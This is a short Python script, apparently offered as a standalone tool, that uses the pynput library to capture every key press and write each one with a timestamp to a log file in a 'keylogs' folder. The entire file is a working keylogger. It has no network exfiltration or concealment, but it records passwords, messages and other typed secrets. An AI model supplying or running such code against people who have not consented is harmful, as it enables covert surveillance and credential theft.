from pynput import keyboard
import logging
from datetime import datetime
import os

# Set up directory for logs
log_dir = "keylogs/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Generate filename with timestamp
filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
log_path = os.path.join(log_dir, filename)

# Configure logging
logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define function to log key presses
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed.')
    except AttributeError:
        logging.info(f'Special Key {key} pressed.')

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()